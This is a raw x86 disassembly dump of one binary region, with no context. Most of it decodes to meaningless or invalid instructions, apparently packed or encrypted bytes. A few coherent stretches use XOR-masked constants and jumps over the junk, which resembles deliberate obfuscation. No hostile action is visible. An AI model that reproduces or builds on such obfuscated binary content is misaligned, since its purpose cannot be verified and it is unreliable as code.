  420b6e:	xchg   ebx,eax
  420b6f:	sub    ebx,DWORD PTR [ebx]
  420b71:	xchg   BYTE PTR [edi-0x49],al
  420b74:	leave  
  420b75:	jmp    0x420b18
  420b77:	push   cs
  420b78:	cs xchg esi,eax
  420b7a:	xchg   ebx,eax
  420b7b:	push   ss
  420b7c:	pop    esp
  420b7d:	mov    eax,DWORD PTR [ebp-0xe8]
  420b83:	mov    ecx,DWORD PTR [ebp-0x144]
  420b89:	jmp    0x420f70
  420b8e:	jo     0x420be5
  420b90:	mov    es,WORD PTR [eax+edi*4-0x74]
  420b94:	mov    ah,0x79
  420b96:	rcl    ah,cl
  420b98:	mov    WORD PTR [eax+eax*4+0x8d15c2d],fs
  420b9f:	stos   DWORD PTR es:[edi],eax
  420ba0:	sar    BYTE PTR [esi-0x41413bb6],0xd
  420ba7:	mov    ch,0x31
  420ba9:	fld    DWORD PTR [esp+edi*8]
  420bac:	popa   
  420bad:	xchg   edi,eax
  420bae:	pop    ecx
  420baf:	push   0x5b
  420bb1:	cli    
  420bb2:	adc    eax,0xffce197b
  420bb7:	or     al,0xf1
  420bb9:	mov    DWORD PTR [ebx],edi
  420bbb:	push   ds
  420bbc:	out    dx,al
  420bbd:	fwait
  420bbe:	rcr    BYTE PTR [edx+0x1947c2db],0x27
  420bc5:	xchg   BYTE PTR [eax+0x55],al
  420bc8:	push   ds
  420bc9:	push   ebp
  420bca:	lds    edi,FWORD PTR [ebx]
  420bcc:	lods   al,BYTE PTR ds:[esi]
  420bcd:	cmp    BYTE PTR [ecx+ebp*1-0x6c],cl
  420bd1:	cmp    BYTE PTR [ebp+eiz*8+0x385d5f93],0x21
  420bd9:	sahf   
  420bda:	repnz sbb DWORD PTR [ebp+0x547dfd25],esp
  420be1:	test   al,0x1f
  420be3:	call   0xca2b91c9
  420be8:	sbb    ch,dh
  420bea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420beb:	jns    0x420c41
  420bed:	add    edi,DWORD PTR [edi+ebx*2+0x60]
  420bf1:	loope  0x420bf3
  420bf3:	jb     0x420bab
  420bf5:	push   ebp
  420bf6:	sub    al,0x4b
  420bf8:	jne    0x420c3b
  420bfa:	fild   DWORD PTR [edx-0x416e9108]
  420c00:	sub    cl,BYTE PTR ds:0xe20e6b4e
  420c06:	arpl   WORD PTR [eax-0x18],si
  420c09:	repz pop ds
  420c0b:	sbb    DWORD PTR [eax+eiz*1-0x6d],esp
  420c0f:	sbb    eax,0xf6604877
  420c14:	test   al,0x10
  420c16:	ret    0x94d1
  420c19:	push   es
  420c1a:	sub    eax,0x45b8c13a
  420c1f:	inc    ebx
  420c20:	mov    bl,0x47
  420c22:	jl     0x420c25
  420c24:	call   0x97c7:0xdeca54fe
  420c2b:	mov    eax,ds:0xa9f1ca99
  420c30:	cmp    al,0xb0
  420c32:	fdivr  st(4),st
  420c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c35:	add    al,0xd9
  420c37:	ror    DWORD PTR ds:0x4d5fd48c,cl
  420c3d:	cli    
  420c3e:	lods   al,BYTE PTR ds:[esi]
  420c3f:	ret    0x1e6f
  420c42:	adc    eax,0xcb76d7fc
  420c47:	cld    
  420c48:	xchg   edi,eax
  420c49:	das    
  420c4a:	or     ecx,DWORD PTR ds:0xadfe8e51
  420c50:	fidiv  WORD PTR [ebp+0x244c8f99]
  420c56:	cmovge esp,DWORD PTR [eax+0x7edb05cc]
  420c5d:	(bad)  
  420c5e:	xor    eax,0x54d00b05
  420c63:	xchg   ebp,esp
  420c65:	pop    ebp
  420c66:	in     eax,0xcd
  420c68:	fistp  DWORD PTR [ebx+edi*1-0x76]
  420c6c:	jge    0x420c63
  420c6e:	daa    
  420c6f:	stos   BYTE PTR es:[edi],al
  420c70:	mov    edi,0x89de7baa
  420c75:	push   0xc9d600aa
  420c7a:	retf   
  420c7b:	jle    0x420c01
  420c7d:	add    eax,0xaa075ff5
  420c82:	data16 fwait
  420c84:	pop    ebp
  420c85:	ret    0xb037
  420c88:	imul   esp,ecx,0x74
  420c8b:	adc    edx,DWORD PTR fs:[ebp+eax*8-0x38]
  420c90:	sub    cl,BYTE PTR [ebp+0x4b98471a]
  420c96:	mov    ebx,0xa3fbfac1
  420c9b:	sub    eax,0xb05df236
  420ca0:	mov    cl,BYTE PTR [edx]
  420ca2:	push   ss
  420ca3:	test   eax,0xe567f693
  420ca8:	push   0x694ea6d5
  420cad:	ficomp WORD PTR [ebp-0x2c]
  420cb0:	push   eax
  420cb1:	js     0x420cee
  420cb3:	push   ebx
  420cb4:	fsub   st(0),st
  420cb6:	push   eax
  420cb7:	jp     0x420c84
  420cb9:	or     dl,BYTE PTR [edi-0x1d]
  420cbc:	out    dx,eax
  420cbd:	icebp  
  420cbe:	ins    DWORD PTR es:[edi],dx
  420cbf:	call   0x30a6b0fb
  420cc4:	lods   eax,DWORD PTR ds:[esi]
  420cc5:	xor    DWORD PTR [ebx+0x403c11fd],0x33d7c318
  420ccf:	and    BYTE PTR [eax],ah
  420cd1:	xchg   esp,eax
  420cd2:	pop    ebp
  420cd3:	xchg   cl,dl
  420cd5:	pop    esp
  420cd6:	sbb    ch,ah
  420cd8:	dec    ebx
  420cd9:	out    dx,eax
  420cda:	and    DWORD PTR ds:0xcd9e379b,edx
  420ce0:	aam    0x84
  420ce2:	icebp  
  420ce3:	mov    ch,0x2
  420ce5:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  420ce7:	adc    eax,0x8ea6699a
  420cec:	or     ah,BYTE PTR [edi-0x7e5228af]
  420cf2:	aam    0xef
  420cf4:	mov    ebx,0xd630686a
  420cf9:	dec    BYTE PTR [edi+0x5e76bbbc]
  420cff:	adc    al,BYTE PTR [eax]
  420d01:	xchg   esi,eax
  420d02:	mov    es,WORD PTR fs:[ebx+ebp*1+0x74]
  420d07:	xchg   BYTE PTR [eax+0x6e080d5d],bl
  420d0d:	mov    esp,0xbfd4fe9e
  420d12:	mov    DWORD PTR [esi-0x3a],ebp
  420d15:	lds    edi,FWORD PTR [ebp+0x2a317513]
  420d1b:	mov    esp,0xbb31e975
  420d20:	pusha  
  420d21:	jle    0x420caf
  420d23:	xchg   edx,eax
  420d24:	fstp   st(0)
  420d26:	aad    0xf7
  420d28:	pop    ebp
  420d29:	fsub   QWORD PTR [ecx-0x22]
  420d2c:	in     eax,0xbc
  420d2e:	ins    DWORD PTR es:[edi],dx
  420d2f:	mul    BYTE PTR [ecx+0x42]
  420d32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d33:	dec    ecx
  420d34:	sbb    eax,0x6631736a
  420d39:	gs test eax,0x6d3ad8bc
  420d3f:	lahf   
  420d40:	sub    al,0x46
  420d42:	cmp    DWORD PTR ds:0x40912199,ebp
  420d48:	sar    DWORD PTR [ebp+0x241abeee],0x40
  420d4f:	mov    al,ds:0xde9f3695
  420d54:	pusha  
  420d55:	outs   dx,BYTE PTR ds:[esi]
  420d56:	inc    ebx
  420d57:	inc    esp
  420d58:	call   0x7592722d
  420d5d:	sub    al,0x9f
  420d5f:	sbb    al,0x4e
  420d61:	inc    esi
  420d63:	ins    DWORD PTR es:[edi],dx
  420d64:	xor    BYTE PTR [esi+eiz*4-0x2974bd8],al
  420d6b:	repz jne 0x420d07
  420d6e:	jne    0x420d11
  420d70:	and    BYTE PTR [eax],dl
  420d72:	dec    eax
  420d73:	inc    eax
  420d74:	retf   0x25d4
  420d77:	jae    0x420d76
  420d79:	inc    eax
  420d7a:	xor    al,cl
  420d7c:	mov    bh,0x45
  420d7e:	adc    BYTE PTR [edi-0x6f],dh
  420d81:	push   0xffffffeb
  420d83:	adc    esp,DWORD PTR [edi+0x1609fd5e]
  420d89:	xchg   DWORD PTR [ecx],esi
  420d8b:	jge    0x420db9
  420d8d:	and    cl,dl
  420d8f:	shl    bl,1
  420d91:	add    bl,dh
  420d93:	cmp    ebp,DWORD PTR [ebp-0x537ba86b]
  420d99:	dec    ebx
  420d9a:	mov    eax,fs
  420d9c:	push   cs
  420d9d:	fwait
  420d9e:	into   
  420d9f:	(bad)  
  420da0:	nop
  420da1:	and    eax,0xfffc24d0
  420da6:	pop    edi
  420da7:	(bad)  
  420da8:	cwde   
  420da9:	xlat   BYTE PTR ds:[ebx]
  420daa:	pop    ecx
  420dab:	aam    0xb5
  420dad:	xor    eax,0xcd5ea881
  420db2:	sub    DWORD PTR [ebx],edi
  420db4:	rcl    BYTE PTR [ebp-0x54815c19],1
  420dba:	into   
  420dbb:	add    esp,ebx
  420dbd:	mov    eax,0x942a4ae9
  420dc2:	stc    
  420dc3:	mov    al,ds:0x42b1ffd5
  420dc8:	fsubr  DWORD PTR [edx+0x1e70a603]
  420dce:	js     0x420d9a
  420dd0:	scas   al,BYTE PTR es:[edi]
  420dd1:	adc    ebp,DWORD PTR [ecx]
  420dd3:	pop    eax
  420dd4:	rcl    DWORD PTR [ebx+0x5b831dc6],cl
  420dda:	push   ebp
  420ddb:	in     eax,0x80
  420ddd:	jge    0x420d96
  420ddf:	sbb    eax,0xc03641a1
  420de4:	dec    BYTE PTR [ecx-0x66]
  420de7:	jb     0x420e4f
  420de9:	mov    eax,ds:0x3ff8abd3
  420dee:	cli    
  420def:	int    0xaa
  420df1:	fisub  DWORD PTR ss:[eax]
  420df4:	frstor [esi+0x4c]
  420df7:	lock retf 
  420df9:	sub    edi,ebx
  420dfb:	xor    ecx,DWORD PTR [edx+esi*2-0x7051bc60]
  420e02:	iret   
  420e03:	pop    ds
  420e04:	imul   edi,DWORD PTR [edi+0x8ae962],0xacb9c33a
  420e0e:	cld    
  420e0f:	add    BYTE PTR [ebx+0x51],0x5e
  420e13:	mov    ds:0x6b8cb0c0,eax
  420e18:	or     DWORD PTR ds:0x9f82f460,edx
  420e1e:	jb     0x420e23
  420e20:	mov    dl,0x27
  420e22:	push   edi
  420e23:	cli    
  420e24:	je     0x420e04
  420e26:	mov    al,0xb5
  420e28:	cmp    BYTE PTR [eax+0x644b79b1],bl
  420e2e:	or     al,0xe0
  420e30:	add    DWORD PTR ds:0xe87e98b1,esi
  420e36:	arpl   WORD PTR [ecx],sp
  420e38:	jns    0x420e3f
  420e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e3b:	bound  ebx,QWORD PTR [edi-0x4be433f2]
  420e41:	aas    
  420e42:	adc    ebp,esp
  420e44:	sbb    eax,0xadecd62
  420e49:	add    esi,DWORD PTR [ebx+0xe]
  420e4c:	iret   
  420e4d:	je     0x420dec
  420e4f:	es test al,0x2f
  420e52:	fst    DWORD PTR [esi]
  420e54:	ds pusha 
  420e56:	add    si,0x86fa
  420e5b:	int3   
  420e5c:	push   edi
  420e5d:	in     eax,dx
  420e5e:	neg    ebp
  420e60:	sahf   
  420e61:	sub    BYTE PTR [edx-0x7c708057],al
  420e67:	cdq    
  420e68:	pop    ecx
  420e69:	mov    dh,0xf2
  420e6b:	fcom   QWORD PTR [ecx-0xe1878ff]
  420e71:	fucomip st,st(0)
  420e73:	lea    ebx,[edx+0x63]
  420e76:	xchg   esi,eax
  420e77:	push   esi
  420e78:	cdq    
  420e79:	xchg   ecx,eax
  420e7a:	arpl   WORD PTR [edx+eiz*1],di
  420e7d:	inc    ebp
  420e7e:	repz sar BYTE PTR [ebp-0x15],0x73
  420e83:	shl    BYTE PTR [edx+0x30],0xd3
  420e87:	in     eax,dx
  420e88:	(bad)  
  420e8a:	adc    BYTE PTR [eax],bh
  420e8c:	inc    edx
  420e8d:	test   DWORD PTR [ebp+0x5bfccd8b],esp
  420e93:	lea    esi,[edx-0x3b]
  420e96:	(bad)  
  420e97:	xor    BYTE PTR [ebp+0x562987ce],bh
  420e9d:	test   DWORD PTR [edi+0x2a],edx
  420ea0:	pop    edx
  420ea1:	aad    0x73
  420ea3:	push   ebx
  420ea4:	cmc    
  420ea5:	aaa    
  420ea6:	lods   eax,DWORD PTR ds:[esi]
  420ea7:	ficom  DWORD PTR [edi+edx*8+0x68a15b40]
  420eae:	dec    esi
  420eaf:	ss xchg edx,eax
  420eb1:	not    BYTE PTR [eax-0x1a19f9cc]
  420eb7:	and    bh,BYTE PTR [ebp+0x19b6cec0]
  420ebd:	mov    BYTE PTR [ecx],cl
  420ebf:	jns    0x420f23
  420ec1:	dec    ebx
  420ec2:	pusha  
  420ec3:	pop    edx
  420ec4:	lds    ebp,FWORD PTR [ecx-0x537b4d3a]
  420eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ecb:	sbb    ecx,esi
  420ecd:	pop    eax
  420ece:	push   ds
  420ecf:	or     al,BYTE PTR [ebp-0x378e6d7b]
  420ed5:	fisubr DWORD PTR [edi+0x5062de3c]
  420edb:	pop    ss
  420edc:	xor    eax,0xcd849384
  420ee1:	daa    
  420ee2:	push   ebp
  420ee3:	inc    esi
  420ee4:	es imul eax
  420ee7:	fst    QWORD PTR ds:0x77ad06e4
  420eed:	out    dx,eax
  420eee:	mov    ecx,0xf523edd1
  420ef3:	mov    al,ds:0xfb1f151f
  420ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ef9:	adc    al,0xc2
  420efb:	mov    ds:0x57134298,al
  420f00:	ret    
  420f01:	mov    WORD PTR [edx+edi*1],?
  420f04:	mov    DWORD PTR [esi+0x1424e19d],ebx
  420f0a:	sbb    edx,DWORD PTR [eax+ecx*2-0xf02f0d6]
  420f11:	scas   eax,DWORD PTR es:[edi]
  420f12:	mov    edx,0xa8401b46
  420f17:	leave  
  420f18:	xchg   esp,eax
  420f19:	fidivr DWORD PTR [ecx]
  420f1b:	ss out 0xa5,al
  420f1e:	mov    DWORD PTR [esi-0x15926e99],esi
  420f24:	in     eax,dx
  420f25:	xor    DWORD PTR [ecx+ebp*2+0xc12e1d5],edi
  420f2c:	inc    ecx
  420f2d:	mov    esi,0x8dbe5f44
  420f32:	rol    BYTE PTR [edx],cl
  420f34:	xchg   ebx,eax
  420f35:	jo     0x420fa0
  420f37:	jb     0x420f16
  420f39:	nop
  420f3a:	sub    eax,0xd6464002
  420f3f:	mov    esp,0xa41233d3
  420f44:	shl    ch,0xe2
  420f47:	cwde   
  420f48:	das    
  420f49:	xor    BYTE PTR [eax-0x6c],ah
  420f4c:	push   es
  420f4d:	cmp    BYTE PTR [esi-0x2],ah
  420f50:	or     eax,0x749eba57
  420f55:	mov    ebx,0xa389829f
  420f5a:	es xchg cl,dl
  420f5d:	and    eax,0x1b56ed99
  420f62:	cmp    esp,esp
  420f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f65:	fcmovne st,st(3)
  420f67:	and    al,0xb8
  420f69:	inc    esi
  420f6a:	mov    dl,dl
  420f6c:	(bad)  
  420f6d:	call   0x487dfed6
  420f72:	sbb    BYTE PTR [edi],cl
  420f74:	test   dh,bl
  420f76:	adc    DWORD PTR [eax],eax
  420f78:	add    BYTE PTR [ebx-0x1437b],cl
  420f7e:	dec    DWORD PTR [ebx+0x558bc84d]
  420f84:	or     BYTE PTR [ebx],al
  420f86:	adc    al,0x81
  420f88:	mov    DWORD PTR [ebp-0x48],edx
  420f8b:	mov    eax,DWORD PTR [ebp-0x48]
  420f8e:	mov    DWORD PTR [ebp-0x210],eax
  420f94:	mov    eax,DWORD PTR [ebp+0xc]
  420f97:	mov    DWORD PTR [ebp-0x20c],eax
  420f9d:	mov    DWORD PTR [ebp-0x1f0],0xcb79b576
  420fa7:	mov    DWORD PTR [ebp-0x1ec],0x9c2b8ae8
  420fb1:	mov    DWORD PTR [ebp-0x1e0],0xcb79b572
  420fbb:	mov    DWORD PTR [ebp-0x1dc],0x9c2b8ae8
  420fc5:	lea    eax,[ebp-0x1e8]
  420fcb:	mov    DWORD PTR [ebp-0x1f4],eax
  420fd1:	mov    eax,DWORD PTR [ebp-0x20c]
  420fd7:	movzx  eax,WORD PTR [eax+0x20]
  420fdb:	xor    eax,0xa59b
  420fe0:	movzx  eax,ax
  420fe3:	sar    eax,1
  420fe5:	mov    ecx,DWORD PTR [ebp-0x20c]
  420feb:	movzx  ecx,WORD PTR [ecx+0x20]
  420fef:	xor    ecx,0xa59b
  420ff5:	movzx  ecx,cx
  420ff8:	shl    ecx,0xf
  420ffb:	or     eax,ecx
  420ffd:	movzx  eax,ax
  421000:	mov    ecx,DWORD PTR [ebp-0x1f4]
  421006:	mov    DWORD PTR [ecx],eax
  421008:	mov    eax,DWORD PTR [ebp-0x1e0]
  42100e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421014:	xor    eax,0xcb79b576
  421019:	xor    edx,0x9c2b8ae8
  42101f:	mov    cl,0x2
  421021:	call   0x408bb8
  421026:	mov    ebx,eax
  421028:	mov    esi,edx
  42102a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421030:	mov    edx,DWORD PTR [ebp-0x1dc]
  421036:	xor    eax,0xcb79b576
  42103b:	jmp    0x421422
  421040:	xchg   ebp,eax
  421041:	or     ebp,DWORD PTR ds:0x9a3cb322
  421047:	mov    esp,0x90cf9e52
  42104c:	in     al,dx
  42104d:	int    0x94
  42104f:	nop
  421050:	xchg   ebx,eax
  421051:	mov    bl,0xc0
  421053:	mov    esi,0xbebec44a
  421058:	mov    al,ds:0xcfc20e3c
  42105d:	jo     0x421074
  42105f:	test   BYTE PTR [ebx+0x2c],bl
  421062:	mov    bl,0xf2
  421064:	add    edi,ecx
  421066:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421067:	pop    ds
  421068:	std    
  421069:	push   ds
  42106a:	in     eax,dx
  42106b:	int3   
  42106c:	mov    edi,0x79a0bef4
  421071:	ins    DWORD PTR es:[edi],dx
  421072:	popa   
  421073:	adc    DWORD PTR ds:0x75045505,esp
  421079:	fild   WORD PTR [edi+0x2e]
  42107c:	icebp  
  42107d:	(bad)  
  42107e:	sub    al,0x4
  421080:	jge    0x421101
  421082:	adc    edx,0x151437c0
  421088:	jae    0x4210d9
  42108a:	(bad)  
  42108b:	dec    eax
  42108c:	add    ah,0x7c
  42108f:	ret    
  421090:	jmp    0xa895fc6f
  421095:	cld    
  421096:	jne    0x421081
  421098:	fbld   TBYTE PTR fs:[esi]
  42109b:	ror    DWORD PTR [esi+0x32363aee],cl
  4210a1:	mov    edi,0x1ef976b0
  4210a6:	xchg   DWORD PTR [eax+0x6a],esi
  4210a9:	mov    al,ds:0xe4a47d09
  4210ae:	push   ebp
  4210af:	sbb    al,0xc4
  4210b1:	dec    esp
  4210b2:	push   esp
  4210b3:	push   eax
  4210b4:	and    bl,dl
  4210b6:	loop   0x42105e
  4210b8:	xor    al,0xc0
  4210ba:	jl     0x42108a
  4210bc:	mov    DWORD PTR [eax+0x3a],eax
  4210bf:	sbb    ecx,DWORD PTR [ecx-0x64e772be]
  4210c5:	sti    
  4210c6:	pop    esi
  4210c7:	adc    dh,bh
  4210c9:	sbb    ch,bh
  4210cb:	mov    dl,0x99
  4210cd:	xchg   esi,eax
  4210ce:	push   0x4c
  4210d0:	inc    edi
  4210d1:	push   ds
  4210d2:	adc    eax,eax
  4210d4:	fs scas eax,DWORD PTR es:[edi]
  4210d6:	push   cs
  4210d7:	mov    ch,0x88
  4210d9:	fs xchg ebp,eax
  4210db:	out    0xc4,al
  4210dd:	lds    esi,FWORD PTR [ebp+0x1a]
  4210e0:	arpl   WORD PTR [edi+0x3a],sp
  4210e3:	add    BYTE PTR [edx-0x16213855],bh
  4210e9:	xchg   ecx,eax
  4210ea:	shr    BYTE PTR [eax+0x12a2b43f],cl
  4210f0:	sti    
  4210f1:	sti    
  4210f2:	std    
  4210f3:	cmp    ecx,ebx
  4210f5:	or     eax,0xc33027b6
  4210fa:	out    0x47,al
  4210fc:	fcmovbe st,st(1)
  4210fe:	imul   edx,DWORD PTR [edx],0x19
  421101:	pop    ebx
  421102:	and    edi,DWORD PTR [ecx]
  421104:	xchg   edx,eax
  421105:	ins    BYTE PTR es:[edi],dx
  421106:	sub    dl,ch
  421108:	sbb    ebp,DWORD PTR [edi+0x5f87b733]
  42110e:	sahf   
  42110f:	pop    edx
  421110:	test   ebx,ebx
  421112:	xor    edx,DWORD PTR [edx]
  421114:	or     ecx,edx
  421116:	pop    esi
  421117:	iret   
  421118:	pop    esi
  421119:	out    0xc4,al
  42111b:	jge    0x4210ec
  42111d:	inc    ecx
  42111e:	cmp    eax,0x2ee40daf
  421123:	dec    eax
  421124:	outs   dx,BYTE PTR ds:[esi]
  421125:	test   al,0x95
  421127:	sar    DWORD PTR [eax*2-0x7ef41559],0x38
  42112f:	das    
  421130:	outs   dx,DWORD PTR ds:[esi]
  421131:	dec    ebx
  421132:	lods   al,BYTE PTR ds:[esi]
  421133:	fisub  DWORD PTR [ecx+0x25]
  421136:	jbe    0x42113a
  421138:	daa    
  421139:	cmp    eax,DWORD PTR [edx]
  42113b:	ret    
  42113c:	adc    al,BYTE PTR [ecx-0x6a718141]
  421142:	pop    edi
  421143:	out    0x4e,eax
  421145:	lahf   
  421146:	popf   
  421147:	std    
  421148:	in     al,dx
  421149:	pop    edi
  42114a:	enter  0xad3c,0x6d
  42114e:	pop    eax
  42114f:	je     0x421198
  421151:	lods   eax,DWORD PTR ds:[esi]
  421152:	fimul  WORD PTR [ecx]
  421154:	ins    BYTE PTR es:[edi],dx
  421155:	mov    esp,0xe4d95379
  42115a:	pop    ds
  42115b:	mov    ds:0xa2da0333,eax
  421160:	(bad)  
  421161:	ja     0x421159
  421163:	or     esi,edx
  421165:	in     al,0x35
  421167:	dec    DWORD PTR [ecx+0x49]
  42116a:	mov    bh,bl
  42116c:	pop    eax
  42116d:	fistp  QWORD PTR [edi+0x5d]
  421170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421171:	push   edi
  421172:	xchg   edi,eax
  421173:	addr16 shl ah,cl
  421176:	pop    ss
  421177:	ds jne 0x421167
  42117a:	aaa    
  42117b:	jne    0x421118
  42117d:	push   0x39
  42117f:	mov    WORD PTR [edi],?
  421181:	loop   0x42111d
  421183:	mov    cl,0xea
  421185:	imul   esi,DWORD PTR [edi-0x45d7a56b],0xaa0afc65
  42118f:	out    dx,eax
  421190:	sbb    al,0xd7
  421192:	cmp    eax,0xca0e59c2
  421197:	es sbb ebx,edx
  42119a:	xchg   DWORD PTR [edx+0xd],esp
  42119d:	xor    esi,DWORD PTR [eax+edx*2-0x5584e3a4]
  4211a4:	or     DWORD PTR [edi+0x34],esp
  4211a7:	loope  0x42118a
  4211a9:	pop    ss
  4211aa:	fisttp WORD PTR [edx]
  4211ac:	idiv   BYTE PTR [ebp+0x12a5a738]
  4211b2:	addr16 pop ds
  4211b4:	pop    ss
  4211b5:	mov    ebx,0xc588d6a0
  4211ba:	loop   0x421232
  4211bc:	(bad)  
  4211bd:	xchg   edx,eax
  4211be:	scas   al,BYTE PTR es:[edi]
  4211bf:	sub    edi,eax
  4211c1:	mov    bh,0x51
  4211c3:	sti    
  4211c4:	mov    ?,ebp
  4211c6:	fisub  WORD PTR [eax-0x1ae23f7d]
  4211cc:	inc    esp
  4211cd:	loope  0x4211cf
  4211cf:	test   eax,0xe94f6679
  4211d4:	rcl    DWORD PTR ds:0x108db1f9,1
  4211da:	or     edi,DWORD PTR [ebx+0x4d]
  4211dd:	xor    al,0x91
  4211df:	call   0x10a2:0x9c4c4f59
  4211e6:	mov    bl,0x5e
  4211e8:	(bad)  
  4211e9:	arpl   WORD PTR [eax-0x43],dx
  4211ec:	call   0x63f79d83
  4211f1:	or     al,0x82
  4211f3:	inc    esi
  4211f4:	arpl   WORD PTR [eax+edx*4-0x53],dx
  4211f8:	aas    
  4211f9:	mov    ebx,0x2aa2088
  4211fe:	dec    ebp
  4211ff:	sbb    al,0xd1
  421201:	add    BYTE PTR [edi+ebp*2-0x45],dh
  421205:	sbb    dh,BYTE PTR [ebx+0x18]
  421208:	test   BYTE PTR [ebx],dh
  42120a:	dec    esi
  42120b:	retf   0x2190
  42120e:	or     al,0x48
  421210:	adc    ecx,DWORD PTR [ebx]
  421212:	mov    eax,0x431467b1
  421217:	push   esi
  421218:	test   al,0x67
  42121a:	in     al,dx
  42121b:	and    DWORD PTR [ecx],eax
  42121d:	ins    DWORD PTR es:[edi],dx
  42121e:	retf   
  42121f:	(bad)  
  421220:	(bad)  
  421222:	push   es
  421223:	or     eax,DWORD PTR [ecx+eax*8]
  421226:	retf   
  421227:	ins    BYTE PTR es:[edi],dx
  421228:	and    al,0x87
  42122a:	test   al,0x31
  42122c:	dec    esi
  42122d:	retf   
  42122e:	sbb    al,0x6f
  421230:	lods   al,BYTE PTR ds:[esi]
  421231:	pop    es
  421232:	fwait
  421233:	sbb    eax,ebx
  421235:	jmp    0x23ef:0xb6bf11b4
  42123c:	idiv   bl
  42123e:	mov    esp,ecx
  421240:	and    bh,bh
  421242:	sub    al,0xec
  421244:	mov    ds:0x65495005,al
  421249:	adc    eax,0x23f2b676
  42124e:	xchg   ebp,eax
  42124f:	stos   DWORD PTR es:[edi],eax
  421250:	ins    BYTE PTR es:[edi],dx
  421251:	in     al,0x6
  421253:	stos   DWORD PTR es:[edi],eax
  421254:	stc    
  421255:	es in  al,0xdf
  421258:	xchg   esp,eax
  421259:	mov    esi,0x32363572
  42125e:	fwait
  42125f:	pop    esp
  421260:	imul   esi,DWORD PTR [eax],0x7ec4c820
  421266:	cdq    
  421267:	xchg   DWORD PTR [eax-0xe333c31],esi
  42126d:	test   al,0x4c
  42126f:	retf   0xc322
  421272:	adc    ah,BYTE PTR [edx+ebp*4]
  421275:	popf   
  421276:	clc    
  421277:	mov    edi,0x6c024a24
  42127c:	dec    edx
  42127d:	mov    ch,0x50
  42127f:	das    
  421280:	pop    es
  421281:	sete   BYTE PTR [edx]
  421284:	in     al,0xe3
  421286:	pop    esp
  421287:	push   ebx
  421288:	(bad)  
  421289:	mov    ecx,ebx
  42128b:	pop    ebx
  42128c:	or     DWORD PTR [ebx+esi*8-0x1aad4247],0x26
  421294:	ss cmc 
  421296:	inc    edx
  421297:	xchg   ebp,eax
  421298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421299:	add    ecx,DWORD PTR [edx+edx*2-0x5d56a040]
  4212a0:	aam    0xa2
  4212a2:	dec    edx
  4212a3:	cmp    BYTE PTR [esi-0x775ff1de],0xac
  4212aa:	mov    ds:0x764d1c96,al
  4212af:	fcom   DWORD PTR [ebp-0x6c7ebafa]
  4212b5:	ficomp WORD PTR [edi-0x17]
  4212b8:	stos   BYTE PTR es:[edi],al
  4212b9:	shr    ebp,1
  4212bb:	sbb    BYTE PTR [ebp-0x53],0x3d
  4212bf:	or     eax,0xc8fb6bf1
  4212c4:	sub    eax,0x4553137c
  4212c9:	or     eax,0x5752d463
  4212ce:	(bad)  
  4212cf:	push   esi
  4212d0:	call   0x9825:0x8f4faf9c
  4212d7:	push   ebp
  4212d8:	inc    esi
  4212d9:	mov    esp,0x938b1374
  4212de:	push   ebx
  4212df:	adc    ebx,DWORD PTR [esi+0x1d]
  4212e2:	inc    esi
  4212e3:	and    eax,0xb98706ce
  4212e8:	and    eax,0x7bc1b9f1
  4212ed:	and    ebx,DWORD PTR [ebp+0x5e]
  4212f0:	or     BYTE PTR [ecx+0x26],0x55
  4212f4:	mov    ebp,0x7ef72d10
  4212f9:	sub    eax,0x57c22fc1
  4212fe:	push   esp
  4212ff:	in     al,0x8a
  421301:	mov    ds:0xe122d7ae,al
  421306:	leave  
  421307:	dec    edx
  421308:	sub    eax,0x5f697549
  42130d:	jecxz  0x4212de
  42130f:	jle    0x421336
  421311:	push   ebp
  421312:	cmp    dh,ch
  421314:	stos   BYTE PTR es:[edi],al
  421315:	adc    dl,BYTE PTR [esi]
  421317:	popa   
  421318:	test   al,0xa3
  42131a:	retf   
  42131b:	std    
  42131c:	inc    BYTE PTR [edi+0x6f6d73be]
  421322:	ds inc edi
  421324:	push   esi
  421325:	ret    
  421326:	out    0x40,al
  421328:	scas   eax,DWORD PTR es:[edi]
  421329:	sub    eax,0xeaf0ba72
  42132e:	jmp    0xd7f6:0x9133bf99
  421335:	jo     0x42134b
  421337:	(bad)  
  421338:	xchg   ebp,eax
  421339:	dec    eax
  42133a:	(bad)
  42133d:	push   edx
  42133e:	mov    es,WORD PTR [edi+0x1139379d]
  421344:	test   bh,bh
  421346:	aad    0x15
  421348:	or     edi,DWORD PTR [ecx+0x64]
  42134b:	adc    eax,0xbf7fcaeb
  421350:	and    al,0x3f
  421352:	daa    
  421353:	lea    edi,[eax+0x6e84b505]
  421359:	cmp    eax,0xddd54654
  42135e:	sbb    eax,0x6ac269c5
  421363:	aad    0x17
  421365:	mov    edi,0x35067931
  42136a:	inc    edi
  42136b:	inc    esi
  42136c:	in     al,dx
  42136d:	lea    esi,[ebx+0x65]
  421370:	test   BYTE PTR [esi],0x1f
  421373:	(bad)  
  421374:	jb     0x421376
  421376:	pusha  
  421377:	jbe    0x421339
  421379:	xchg   edi,eax
  42137a:	mov    dh,0x55
  42137c:	mov    esp,0xabca1cc7
  421381:	das    
  421382:	xor    dl,BYTE PTR [esi-0x3bc9f545]
  421388:	inc    edx
  421389:	mov    dh,0x74
  42138b:	cmp    ch,0xb1
  42138e:	sahf   
  42138f:	jmp    0x9cb6:0xdb9e1ec8
  421396:	xchg   edi,eax
  421397:	jp     0x421414
  421399:	sbb    al,0xe
  42139b:	repnz mov es:0x1476e4dc,eax
  4213a2:	push   esp
  4213a3:	test   eax,0xa77f388b
  4213a8:	sub    dh,dh
  4213aa:	cmp    esi,DWORD PTR [edi+eiz*2+0x2271aaa0]
  4213b1:	call   0xab41f230
  4213b6:	or     DWORD PTR [edi-0x61],ebp
  4213b9:	lods   al,BYTE PTR ds:[esi]
  4213ba:	inc    esp
